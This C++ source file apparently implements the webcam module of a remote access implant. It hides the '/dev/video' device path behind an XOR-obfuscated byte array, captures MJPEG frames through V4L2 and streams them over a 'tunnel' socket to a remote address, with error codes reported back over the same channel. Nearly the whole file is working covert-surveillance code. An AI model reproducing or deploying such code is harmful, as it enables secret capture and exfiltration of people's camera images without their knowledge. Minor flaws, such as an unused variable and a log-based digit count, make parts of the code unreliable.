#include "clwebcam_recorder.hpp"

// Define the frame delay in microseconds

void CLWebcamRecorder::run() {
    // Convert device number
    char* endptr = nullptr;
    errno = 0;
    memcpy(&device_num_, argv_, sizeof(uint32_t));

    if (webcam_init() < 0) {
        send_out(tunnel_socket_, EXEC_ERROR, (struct sockaddr*) &tunnel_addr_, &tunnel_addr_len_);
        return;
    }
    printf("[run] Initialization successful\n");

    while (!tunnel_shutdown_flag_) {
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(dev_fd_, &fds);
        struct timeval tv = {2, 0};

        int rc = select(dev_fd_ + 1, &fds, NULL, NULL, &tv);
        if (rc < 0) {
            send_out(tunnel_socket_, EXEC_ERROR, (struct sockaddr*) &tunnel_addr_, &tunnel_addr_len_);
            printf("[run] Error with select\n");
            break;
        } else if (rc == 0) {
            printf("[run] Timeout\n");
            continue;
        }

        // Dequeue the buffer for usage
        struct v4l2_buffer buf = {};
        buf.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
        buf.memory = V4L2_MEMORY_MMAP;
        if (ioctl(dev_fd_, VIDIOC_DQBUF, &buf) < 0) {
            send_out(tunnel_socket_, EXEC_ERROR, (struct sockaddr*) &tunnel_addr_, &tunnel_addr_len_);
            printf("[run] Error when dequeing the buffer\n");
            break;
        }
        
        // Send as raw decoded mjpeg image
        rc = send_frame(&buf);
        if (rc < 0) {
            send_out(tunnel_socket_, EXEC_ERROR, (struct sockaddr*) &tunnel_addr_, &tunnel_addr_len_);
            break;
        }

        // Requeue the buffer
        if (ioctl(dev_fd_, VIDIOC_QBUF, &buf) < 0) {
            send_out(tunnel_socket_, EXEC_ERROR, (struct sockaddr*) &tunnel_addr_, &tunnel_addr_len_);
            printf("[run] Error when requeing the buffer\n");
            break;
        }
        
        usleep(FRAME_DELAY_US);
    }

    webcam_cleanup();

}

int CLWebcamRecorder::webcam_init() {
    // Open the target video device
    memset(buffers_, 0, sizeof(buffers_));
    unsigned char obf[] = {0x80, 0xcb, 0xca, 0xd9, 0x80, 0xd9, 0xc6, 0xcb, 0xca, 0xc0};
    char input_path[PATH_MAX];

    int num_size = (device_num_ == 0 || device_num_ == 1) ? 2 : (int) (ceil(log(device_num_) + 1));
    char str_device_num[num_size];        

    snprintf(str_device_num, num_size, "%u", device_num_);

    for (int i = 0;i<sizeof(obf);i++) {
        input_path[i] = obf[i] ^ OBF_KEY;
    }

    strncpy(input_path + sizeof(obf), str_device_num, num_size);

    printf("[webcam_init] File name is: %s\n", input_path);

    dev_fd_ = open(input_path, O_RDWR);
    if (dev_fd_ < 0) {
        printf("[webcam_init] Error while opening the dev\n");
        return -1;
    }

    // Pixel format
    struct v4l2_format fmt = {};
    fmt.fmt.pix.width = PIX_WIDTH;
    fmt.fmt.pix.height = PIX_HEIGHT;
    fmt.fmt.pix.pixelformat = V4L2_PIX_FMT_MJPEG; // Minimal size when sending
    fmt.fmt.pix.field = V4L2_FIELD_NONE;
    fmt.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    if (ioctl(dev_fd_, VIDIOC_S_FMT, &fmt) < 0) {
        printf("[webcam_init] Error setting format\n");
        return -1;
    }

    // Request buffer
    struct v4l2_requestbuffers req = {};
    req.count = BUFFER_COUNT;
    req.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    req.memory = V4L2_MEMORY_MMAP;
    if (ioctl(dev_fd_, VIDIOC_REQBUFS, &req) < 0) {
        printf("[webcam_init] Error requesting buffer\n");
        return -1;
    }

    // Map each buffer
    for (int i=0;i<BUFFER_COUNT;i++) {
        struct v4l2_buffer buf = {};
        buf.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
        buf.memory = V4L2_MEMORY_MMAP;
        buf.index = i;

        if (ioctl(dev_fd_, VIDIOC_QUERYBUF, &buf) < 0) {
            printf("[webcam_init] Error mapping the buffers\n");
            return -1;
        }
        
        
        buffers_[i].start_= mmap(NULL, buf.length, PROT_READ | PROT_WRITE, MAP_SHARED, dev_fd_, buf.m.offset);
        if (buffers_[i].start_ == MAP_FAILED) {
            printf("[webcam_init] Error mapping the buffers\n");
            return -1;
        }
        buffers_[i].length_ = buf.length;
    }

    // Queue the buffers
    for (int i=0;i<BUFFER_COUNT;i++) {
        struct v4l2_buffer buf = {};
        buf.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
        buf.memory = V4L2_MEMORY_MMAP;
        buf.index = i;
        if (ioctl(dev_fd_, VIDIOC_QBUF, &buf) < 0) {
            printf("[webcam_init] Error queuing the buffers\n");
            return -1;
        }
    }

    // Start streaming
    unsigned int type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    if (ioctl(dev_fd_, VIDIOC_STREAMON, &type)) {
        printf("[webcam_init] Error starting stream\n");
        return -1;
    }

    return 0;
}

int CLWebcamRecorder::send_frame(struct v4l2_buffer* __p_buf) {
    if (__p_buf->index >= BUFFER_COUNT) {
        printf("[send_frame] invalid __index: %u\n", __p_buf->index);
        return -1;  
    }
    void* p_buf = buffers_[__p_buf->index].start_;
    if (p_buf)
    if (sendto(tunnel_socket_, p_buf, __p_buf->bytesused, 0, (struct sockaddr*) &tunnel_addr_, tunnel_addr_len_) < 0) {
        return -1;
    }

    return 0;
}

void CLWebcamRecorder::webcam_cleanup() {
    if (dev_fd_ != -1) {
        unsigned int type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
        ioctl(dev_fd_, VIDIOC_STREAMOFF, &type);

        for (int i=0;i<BUFFER_COUNT;i++) {
            if (buffers_[i].start_ != nullptr) {
                munmap(buffers_[i].start_, buffers_[i].length_);
            }
        }

        close(dev_fd_);
    }
}